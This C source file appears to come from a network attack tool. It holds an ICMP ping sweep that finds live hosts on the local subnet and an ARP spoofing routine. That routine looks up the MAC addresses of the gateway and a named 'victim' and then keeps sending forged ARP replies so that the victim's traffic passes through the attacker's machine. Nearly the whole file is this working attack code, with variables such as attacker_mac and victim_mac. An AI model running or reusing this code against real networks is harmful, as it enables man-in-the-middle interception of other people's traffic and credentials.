#include "core.h"

void* start_local_ip_discovery(void* local_ip_discovery_args) {
    int icmp_sock = get_icmp_socket();
    LocalIPDiscoveryArgs* args = (LocalIPDiscoveryArgs*)
        local_ip_discovery_args;

    u32 netmask_hl = get_netmask_hl(args->if_name);
    u32 netaddr_hl = get_netaddr_hl(args->if_name);

    int n_addrs = get_n_addr_in_net(netmask_hl);
    for (int i = 0; i < n_addrs; ++i) {
        u32 addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, i);
        send_icmp_request(icmp_sock, i, addr_hl, 0);
    }
    // u32 addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 2);
    // send_icmp_request(icmp_sock, 1, addr_hl, 0);

    // addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 101);
    // send_icmp_request(icmp_sock, 1, addr_hl, 0);

    // addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 1);
    // send_icmp_request(icmp_sock, 1, addr_hl, 0);

    while (1) {
        icmp rep = {0};
        u8 buffer[128] = {};
        if (receive_socket_reply(icmp_sock, buffer, sizeof(buffer), 1)) {
            iphdr* ip_header = (iphdr*)buffer;
            icmp body = {0};
            memcpy(&body, buffer + (ip_header->ihl * 4), sizeof(icmp));
            if (body.icmp_type != ICMP_ECHOREPLY) {
                fprintf(
                    stderr,
                    "WARNING: receive_icmp_reply, the reply is received, "
                    "but its "
                    "type is not equal to ICMP_ECHOREPLY\n"
                );
            } else {
                uint16_t idx = ntohs(body.icmp_hun.ih_idseq.icd_seq);
                u32 addr_hl = get_addr_hl_in_net(
                    netaddr_hl, netmask_hl, idx
                );
                in_addr addr = {.s_addr = addr_hl};
                printf("%s is alive\n", inet_ntoa(addr));
            }
        }
    }
}

void* start_arp_spoof(void* arp_spoof_args) {
    int arp_sock = get_arp_socket();
    ARPSpoofArgs* args = (ARPSpoofArgs*)arp_spoof_args;
    Mac attacker_mac = get_interface_mac(args->if_name);
    u32 gateway_addr_hl = get_gateway_addr_hl(args->if_name);
    u32 victim_addr_hl = inet_addr(args->victim_addr_str);

    Mac gateway_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &gateway_mac, gateway_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain gateway mac\n");
        close(arp_sock);
        exit(1);
    }

    Mac victim_mac = {0};
    if (request_target_mac(
            arp_sock, args->if_name, &victim_mac, victim_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain victim mac\n");
        close(arp_sock);
        exit(1);
    }

    printf("INFO: ARP spoof started on victim:\n    MAC: ");
    print_mac(victim_mac);
    printf("\n    IP:  ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    args->is_terminated = 0;
    time_t start_time = 0;
    int elapsed_time;
    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time >= args->spoof_period_sec) {
            send_arp_spoof(
                arp_sock,
                args->if_name,
                attacker_mac,
                gateway_addr_hl,
                victim_mac,
                victim_addr_hl
            );
            start_time = time(NULL);
        }
    } while (args->is_terminated == 0);

    close(arp_sock);
    return NULL;
}
